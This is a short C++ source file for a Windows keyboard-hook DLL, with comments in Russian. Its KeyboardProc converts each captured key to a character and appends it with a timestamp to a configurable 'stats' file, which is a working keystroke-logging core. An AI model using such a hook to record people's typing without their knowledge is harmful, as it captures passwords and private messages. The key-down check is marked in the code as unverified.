#include "pch.h"
#include "framework.h"
#include "kbhookproc.h"

std::string statsPath = "";
std::string modPath = "";
std::string badWords = "";

extern "C" KBHOOKPROC_API void SetStatsPath(std::string newPath) {
	statsPath = newPath;
}
extern "C" KBHOOKPROC_API void SetModPath(std::string newPath) {
	modPath = newPath;
}
extern "C" KBHOOKPROC_API void SetBadWordsPath(std::string newPath) {
	badWords = newPath;
}

extern "C" KBHOOKPROC_API LRESULT KeyboardProc(
	_In_ int    code,
	_In_ WPARAM wParam,
	_In_ LPARAM lParam
)
{
	if (lParam > 0x8000) {//keyDown?? (нужно проверить)
		UINT uScanCode = MapVirtualKeyA(wParam, 0);

		BYTE KeyState[256];
		WORD BufChar;

		GetKeyboardState(KeyState);

		ToAscii(wParam, uScanCode, KeyState, &BufChar, 0);
		char  chOutput = char(BufChar);

		auto start = std::chrono::system_clock::now();

		std::time_t end_time = std::chrono::system_clock::to_time_t(start);
		char timeBuff[50];
		ctime_s(timeBuff, sizeof(timeBuff), &end_time);

		std::ofstream ofs(statsPath, std::ofstream::out | std::ofstream::app);
		ofs << "'" << chOutput << "'" << " : " << timeBuff;
		ofs.close();

	}
	// CallNextHookEx чтобы остальные приложения могли ловить этот хук (проикдываем дальше)
	return CallNextHookEx(NULL, code, wParam, lParam);
}